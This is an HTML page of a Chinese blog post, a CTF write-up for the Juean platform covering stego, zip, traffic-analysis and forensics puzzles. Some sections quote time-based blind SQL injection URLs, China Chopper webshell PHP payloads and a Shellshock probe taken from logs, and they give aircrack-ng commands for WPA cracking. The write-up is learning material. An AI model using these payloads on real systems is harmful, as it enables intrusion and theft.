@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="notwiner">
+    
+    <meta name="description" content="notwiner的小站,notwiner,博客,博客笔记">
+    
+    
+    
+    
+    
+    
+    <title>掘安平台Writeup | notwiner</title>
+    <link href="http://www.notwiner.top" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://www.notwiner.top">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">notwiner</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/categories/notes/">notes</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/program/">program</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/web/">web</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%B7%A5%E5%85%B7/">工具</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
+                        </li>
+                        
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/Burpsuite/">Burpsuite</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/Git/">Git</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/PHP/">PHP</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/sql/">sql</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/XSS/">XSS</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/hexo/">hexo</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://www.notwiner.top">notwiner</a>
+        >
+        <span>掘安平台Writeup</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2020/01/29/%E6%8E%98%E5%AE%89%E5%B9%B3%E5%8F%B0Writeup/">掘安平台Writeup</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/%E6%8E%98%E5%AE%89CTF/">掘安CTF</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2020-01-29
+            </span>
+            
+			<span class="label label-gal">
+				<p id="busuanzi_value_page_pv" class="fa fa-eye"></p>
+            </span>
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2020/01/29/%E6%8E%98%E5%AE%89%E5%B9%B3%E5%8F%B0Writeup/">掘安平台Writeup</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2020-01-29
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/%E6%8E%98%E5%AE%89CTF/">掘安CTF</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <p>新学习sql注入，找个东西训练下。<span id="more"></span></p>
+<p>刷一部分sqli-labs，先<a target="_blank" rel="noopener" href="https://ctf.jasec.cn/challenges">掘安平台</a>做点CTF，主要目的是练习web，MSIC和crypto则顺便。</p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h3><p>没什么说的，关注公众号jasafe110然后发flag就行。</p>
+<h3 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h3><p>流量分析基础题目，工具<a target="_blank" rel="noopener" href="https://www.wireshark.org/download.html">wireshark</a></p>
+<p>导入后为下图界面</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJ9aQ.jpg" alt="3XJ9aQ.jpg"></p>
+<p>点工具栏的Protocol使之通过传输协议排序，或者直接通过上面的过滤器，找TCP和HTTP即可（基础类型的一般这两个够用）。</p>
+<p>挨个点，注意最下面的窗口会显示传输具体内容，发现有一个time为11.930535的，编号为73的有flag字样。但是这个现在没办法复制，选中有flag字样的那一行后右键——追踪流——TCP或者HTTP均可，然后现在就可以复制了。</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XGxr8.jpg" alt="3XGxr8.jpg"></p>
+<p>tips: 流量分析这些即为平时使用浏览器访问所产生的数据流，有不同协议类型（TCP、HTTP、UDP等等），具体可以找wireshark或者流量分析的书看，之前<a target="_blank" rel="noopener" href="https://notwiner.top/2019/07/24/%E5%88%9D%E5%A7%8BWireshark/#more">初始wireshark</a>有过部分总结。</p>
+<h3 id="misc-hello"><a href="#misc-hello" class="headerlink" title="misc-hello"></a>misc-hello</h3><p>解压是个图片，字节分析<a target="_blank" rel="noopener" href="https://mh-nexus.de/en/hxd/">HxD</a>看一眼，搜索下flag，结束</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/3XGXxP"><img src="https://s2.ax1x.com/2020/03/07/3XGXxP.jpg" alt="3XGXxP.jpg"></a></p>
+<h3 id="disk"><a href="#disk" class="headerlink" title="disk"></a>disk</h3><p>磁盘里藏着flag</p>
+<p>解压后发现两个文件，flag.dmg和.DS_Store，明显flag.dmg有用，放HxD看一下，</p>
+<p>大多为乱码，搜索flag又没有有价值的线索，滑动着看，发现临近底部时候出现了%PNG，图片png标识也是这个，复制从%PNG的十六进制数，直到00结尾前的IEND®B`‚这个也是PNG的结束位，新建粘贴另存为xx.png，发现flag</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XGvKf.png" alt="3XGvKf.png"></p>
+<h3 id="图片对比"><a href="#图片对比" class="headerlink" title="图片对比"></a>图片对比</h3><p>两张图片有什么不一样吗？</p>
+<p>解压，发现两个图片，flag.png和xor.png，放到HxD发现前面部分只有开头有差别，联系上题目为图片对比，猜测异或。（其实也可能是先修复文件头然后放到stegsolve里面对比，但是这里是字符异或）</p>
+<p>上脚本，第一次做题写python脚本，不太熟练。（大佬们轻点吐槽）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ab = open(&quot;flag.png&quot;, &quot;rb&quot;).read(20)</span><br><span class="line">print(ab)</span><br><span class="line">ac = open(&quot;xor.png&quot;,&quot;rb&quot;).read(20)</span><br><span class="line">print(ac)</span><br><span class="line">ab_1 = list(ab);</span><br><span class="line">ac_1 = list(ac);</span><br><span class="line">print(ab_1)</span><br><span class="line">print(ac_1)</span><br><span class="line">ad = [&#x27;x&#x27; for n in range(20)]</span><br><span class="line">for i in range(19) :</span><br><span class="line">    ad[i] = ab_1[i] ^ ac_1[i]</span><br><span class="line">    i = i + 1</span><br><span class="line">print (ad)</span><br><span class="line">for i in range(19):</span><br><span class="line">    ad[i] = chr(ad[i])</span><br><span class="line">    i = i + 1</span><br><span class="line">ad = &quot;&quot;.join(str(i) for i in ad)</span><br><span class="line">print(ad)</span><br></pre></td></tr></table></figure>
+<p>然后出现结果</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJFGn.jpg" alt="3XJFGn.jpg"></p>
+<h3 id="颜表情"><a href="#颜表情" class="headerlink" title="颜表情"></a>颜表情</h3><h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><p>漂亮的小姐姐</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XGzqS.png" alt="3XGzqS.png"></p>
+<p>（非上图，原图无法显示，截屏的）一看，图片尺寸不太对劲，有点太宽太低了，猜测是修改像素值，先看原始尺寸为<code>1566*798</code>，十进制转十六进制，得到<code>061e*031e</code>，放到HxD里面搜索这两个，两个在临近才对，随便修改下为041e，通关。</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJAx0.jpg" alt="3XJAx0.jpg"></p>
+<h3 id="真正的黑客才可以看到本质"><a href="#真正的黑客才可以看到本质" class="headerlink" title="真正的黑客才可以看到本质"></a>真正的黑客才可以看到本质</h3><p>真正的黑客才可以看到本质</p>
+<p>解压，hacker.png，放到<a target="_blank" rel="noopener" href="http://www.caesum.com/handbook/Stegsolve.jar">StegSolve</a>，看各个色位的效果，Blue plane 0出现二维码，扫码或者QR识别，得到flag。</p>
+<h3 id="隐藏在黑夜里的秘密"><a href="#隐藏在黑夜里的秘密" class="headerlink" title="隐藏在黑夜里的秘密"></a>隐藏在黑夜里的秘密</h3><p>隐藏在黑夜里的秘密</p>
+<p>解压发现加密，放到zip密码爆破工具里面发现异常，应该是伪加密，</p>
+<p>放到HxD里面，搜索504B（即文件头），找1400后面的，这里面是0008或者0908，挨个修改09为00（记得文件右键解除锁定），有两个需要修改，（下图为修改后的部分）</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJVMV.jpg" alt="3XJVMV.jpg"></p>
+<p>然后解压，发现flag.txt和Treeinblack.bmp，bmp格式经常是<a target="_blank" rel="noopener" href="http://www.caesum.com/handbook/Stegsolve.jar">StegSolve</a>有关的图片隐写格式，打开，然后一直点箭头，发现到Red plane 3时候就已经出现结果。（说好的黑夜呢？不应该是black吗？）</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJZrT.jpg" alt="3XJZrT.jpg"></p>
+<p><strong>tips:</strong> </p>
+<blockquote>
+<p>伪加密牵扯到zip压缩包格式问题，在zip中，504B0304为文件头（即文件标识），1400为解压所需版本，0100为加解密（偶不需要密码，奇数需要密码，所以修改09为00），0800为压缩方式，后面的两个xxxx和xxxx为文件修改时间和日期，再后面为CRC-32校验、尺寸、文件名长度、扩展记录等等。</p>
+</blockquote>
+<h3 id="pikaqiu"><a href="#pikaqiu" class="headerlink" title="pikaqiu"></a>pikaqiu</h3><p>Why can’t I open this picture</p>
+<p>解压后发现pikaqiu.jpg的图片，但是损坏，放到HxD里面，发现文件头和文件尾都很不正常，搜了下jpeg的文件头和文件尾，文件头为FFD8FF，文件尾为FFD9，添加即可，注意初始已经有FF了，所以文件头只需要添加FFD8。</p>
+<p><strong>tips：</strong></p>
+<blockquote>
+<p>不做搬运工，直接放链接<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lwy-kitty/p/3928317.html">文件头与文件尾总结</a></p>
+</blockquote>
+<h3 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h3><p>see through the appearance to perceive the essence</p>
+<p>解压，decode.docx的文件，估计是文档隐写，</p>
+<p>在word中找到显示，把隐藏文字勾选即可。（复制时候可能无法复制，直接清除样式即可）</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJeqU.jpg" alt="3XJeqU.jpg"></p>
+<h3 id="damage"><a href="#damage" class="headerlink" title="damage"></a>damage</h3><p>Help me fix him 格式：Flag{}</p>
+<p>还是图片隐写类，放到HxD里面修改文件头，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lwy-kitty/p/3928317.html">文件头与文件尾总结</a>，注意已经有G和9了，加上IF8（即49 46 38就行了），然后是动图，简单，放到PS或者StegSolve——Frame Browser就行了（注意e可能会被认为是o）</p>
+<h3 id="低头才是王道"><a href="#低头才是王道" class="headerlink" title="低头才是王道"></a>低头才是王道</h3><p>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33<br>格式:jactf{}</p>
+<p>提示低头，低头肯定是键盘密码了，连续的都是重复，而且不超过3个，所以第一个数字确定从哪数，也就是横坐标，多少个位数决定纵坐标。</p>
+<p>所以99是l，9是o，88是k，以此类推，得到一串字符，加上格式就行了</p>
+<h3 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h3><p>第一解出人：Gemini_Pulsar   misc-挑战1</p>
+<p>一堆数据表，还是走基本路子，大多在HTTP里面，Protocol排序后先看HTTP协议，发现一堆base64有关的，应该是base64编码传输，复制一两个，然后解码</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJnZF.jpg" alt="3XJnZF.jpg"></p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJQi9.jpg" alt="3XJQi9.jpg"></p>
+<p>百度了一下可能是中国菜刀一句话有关的东西，不过没关系，做这个题时候我也没学好菜刀，然后挨个复制了几个HTTP的base64编码传输，大多都是这样，没啥用。开始针对性找，对base64的先忽略。</p>
+<p>然后发现一个下图的数据包，后面有FFD8之类的，前面图片隐写知道这是图片的文件头，后面FFD9也对应，复制Form item:”z2”的值，放到HxD里面，并且重命名为jpg后缀，</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJiPs.jpg" alt="3XJiPs.jpg"></p>
+<p>提交一下，发现不对，就知道没这么简单，那估计是密码。</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJ3xx.jpg" alt="3XJ3xx.jpg"></p>
+<p>继续向后走快结束HTTP时，发现下图的数据包，PK是zip压缩包的前缀，后面有well,you need passwd!，还有箭头，确定了，复制值（别复制编码后的，通过Line-based显示分组字节并改为原始数据再复制），然后解压输入上面图片得到的密码即可拿到有flag的flag.txt文件。</p>
+<h3 id="sqlmap二分法"><a href="#sqlmap二分法" class="headerlink" title="sqlmap二分法"></a>sqlmap二分法</h3><p>类型：Forensic  黑客利用漏洞从Web系统中窃取了什么机密信息？</p>
+<p>sqlmap二分法，幸亏之前学了sql注入，然后刷了sqli-labs，二分法就是通过盲注然后猜测数据库内信息的名称的过程，基本路线是通过猜测数据库名称是否&gt;64，然后根据回显继续进行判断是否&gt;96，继续判断是否大于112，然后再去中间值判断，之后的字符判断重复这个过程。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.186 - - [26/Oct/2017:05:36:44 +0000] &quot;GET /admin_fsoEdit.php HTTP/1.1&quot; 404 455 &quot;-&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure>
+<p>这样的大多对解题无用，跳过，后面的由于是服务器日志记录，所以先进行URL解码再看，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET /vulnerabilities/sqli_blind/?id=123%22%29%20AND%20MAKE_SET%289884%3D9884%2C6191%29%20AND%20%28%22xQSw%22%20LIKE%20%22xQSw&amp;Submit=Submit HTTP/1.1&quot; 200 1702 </span><br></pre></td></tr></table></figure>
+<p>解码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET /vulnerabilities/sqli_blind/?id=123&quot;) AND MAKE_SET(9884=9884,6191) AND (&quot;xQSw&quot; LIKE &quot;xQSw&amp;Submit=Submit HTTP/1.1&quot; 200 1702 </span><br></pre></td></tr></table></figure>
+<p>还是无用，这样类似的忽略，继续跳着看，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET /vulnerabilities/sqli_blind/?id=123%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E224001%2C0%2C5%29%29%29%29%29KJQq%29--%20UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702</span><br></pre></td></tr></table></figure>
+<p>解码后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET /vulnerabilities/sqli_blind/?id=123&#x27; AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag ORDER BY flag LIMIT 0,1),1,1))&gt;224001,0,5)))))KJQq)-- UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702</span><br></pre></td></tr></table></figure>
+<p>不太熟悉，但是看到常用的了，IF、ORD、ORDER BY、LIMIT，已经靠近了，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET /vulnerabilities/sqli_blind/?id=123%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%3E64%2C0%2C5%29%29%29%29%29KJQq%29--%20UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702 </span><br></pre></td></tr></table></figure>
+<p>解码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET /vulnerabilities/sqli_blind/?id=123&#x27; AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag ORDER BY flag LIMIT 0,1),1,1))&gt;64,0,5)))))KJQq)-- UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702</span><br></pre></td></tr></table></figure>
+<p>完美，sql注入的二分法第一句话，而且后面语句发现了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET /vulnerabilities/sqli_blind/?id=123%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag%20AS%20CHAR%29%2C0x20%29%20FROM%20dvwa.flag%20ORDER%20BY%20flag%20LIMIT%200%2C1%29%2C1%2C1%29%29%21%3D102%2C0%2C1%29%29%29%29%29KJQq%29--%20UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702</span><br></pre></td></tr></table></figure>
+<p>解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;GET /vulnerabilities/sqli_blind/?id=123&#x27; AND (SELECT * FROM (SELECT(SLEEP(1-(IF(ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag ORDER BY flag LIMIT 0,1),1,1))!=102,0,1)))))KJQq)-- UkLR&amp;Submit=Submit HTTP/1.1&quot; 200 1702</span><br></pre></td></tr></table></figure>
+<p>每一次二分法后专门判断了是否相等的操作，这样就可以直接用<code>%21%3D</code>（即!=）去搜索，然后记录后面的字符，挨个记录后为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</span><br></pre></td></tr></table></figure>
+<p>转为字符串为flag{3287fe300f28e24aefa2d86883832c9f}，提交不对。。。看完WP发现大佬是python2，我没python2，然后联系平台大佬才发现这是个希尔加密，再解密就是提交的flag，但是并没有搞懂密钥是哪个。</p>
+<h3 id="机密信息"><a href="#机密信息" class="headerlink" title="机密信息"></a>机密信息</h3><p>类型：Forensic</p>
+<p>黑客通过webshell往Web服务器写入了一串机密信息，你能找出机密信息吗？</p>
+<p>解压文件夹黑客留下的机密信息，日常，先修改后缀名为zip，解压放到HxD发现是个网页，虽然感觉不会有什么有用的东西，先改后缀名为.html，界面如下图，应该是DVWA的训练。</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJJsK.jpg" alt="3XJJsK.jpg"></p>
+<p>没啥用，直接看WireShark，还是老路走，点Protocol让他们根据协议分类，然后看HTTP协议的内容。</p>
+<p>基于这数据包出题的习惯，建议已经过新手的直接从后面倒着看，倒数第二个发现明显的base64_decode，</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJYqO.jpg" alt="3XJYqO.jpg"></p>
+<p>base64解码得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;</span><br><span class="line">&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die();￿=/var/www/html/secret/</span><br></pre></td></tr></table></figure>
+<p>拿着百度一下，发现应该是菜刀的连接之类的，而且看到了/secret/。再对上题目估计就是找这个目录下的东西了，一上来距离感觉就很接近了，然后继续慢慢找，又找到了一个base64加密的</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJNZD.jpg" alt=""></p>
+<p>解码后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;echo @fwrite(fopen(base64_decode($_POST[&quot;z1&quot;]),&quot;w&quot;),base64_decode($_POST[&quot;z2&quot;]))?&quot;1&quot;:&quot;0&quot;;;echo(&quot;|&lt;-&quot;);die();￿=/var/www/html/secret/s3cr3t.txt￿=flag&#123;Inf0rm4ti0n53curity&#125;</span><br></pre></td></tr></table></figure>
+<p>emmm这就拿到flag有点算是非正常解了，hhhh，但是看到s3cr3.txt和前面估计也是正确的。</p>
+<p>本来就是为了训练，又翻了这个数据包，</p>
+<p>发现前面有Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c  MD5解为acunetix，</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJysf.jpg" alt="3XJysf.jpg"></p>
+<p>（记得选择分组字节后可以更改下面的解码方式）</p>
+<p>发现了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: () &#123; Referer; &#125;; echo -e &quot;Content-Type: text/plain\n&quot;; echo -e &quot;\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153&quot;</span><br></pre></td></tr></table></figure>
+<p>百度了，发现是awvs在测试shellshock（破壳漏洞）。</p>
+<h3 id="你先还是我先"><a href="#你先还是我先" class="headerlink" title="你先还是我先"></a>你先还是我先</h3><p>解压，文件名称就提示base，一看内容，emmmm太多了，网上base解码够呛，使用python自带的base64模块解码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">ab = open(&quot;base.txt&quot;,&quot;r+&quot;)</span><br><span class="line">content = ab.read();</span><br><span class="line">print (len(content))</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        content = base64.b64decode(content).decode()</span><br><span class="line">    except:</span><br><span class="line">        try:</span><br><span class="line">            content = base64.b32decode(content).decode()</span><br><span class="line">        except:</span><br><span class="line">            try:</span><br><span class="line">                content = base64.base16decode(content).decode()</span><br><span class="line">            except:</span><br><span class="line">                print(&#x27;&#x27;,content)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>
+<p>一下子结果就出来了。</p>
+<h3 id="过滤语法"><a href="#过滤语法" class="headerlink" title="过滤语法"></a>过滤语法</h3><h3 id="二维码藏到哪里了"><a href="#二维码藏到哪里了" class="headerlink" title="二维码藏到哪里了"></a>二维码藏到哪里了</h3><h3 id="WireLess"><a href="#WireLess" class="headerlink" title="WireLess"></a>WireLess</h3><p>解压，看见WiFi.pcap和README.txt，README.txt提供了密码格式为6666xxxx，WireShark看WiFi.pcap，看了半天，没什么有用的东西，只找到了flag{05password-f059-448f}，好的吧，想了想，WiFi估计是破解密码了，如果不接触可能这题没法做。</p>
+<p>打开kali（记得安装vmwaretools方便拖拽文件），先输入crunch确定 有没有，然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 8 8 -t 6666%%%% &gt;&gt; 123.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJwid.jpg" alt="3XJwid.jpg"></p>
+<p>生成密码（前面是最小位数和最大位数，后面是输出文件），这样密码字典生成完毕</p>
+<p>启动Aircrack-ng，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 WiFi.pcap -w 123.txt</span><br></pre></td></tr></table></figure>
+<p>回车，发现有个flag{05password-f059-448f}的位置，输入前面序号即可开始破解。</p>
+<p><img src="https://s2.ax1x.com/2020/03/07/3XJ0JA.jpg" alt="3XJ0JA.jpg"></p>
+<p>将66668912与前面的flag里面的password替换提交即可，记得格式为Flag{}</p>
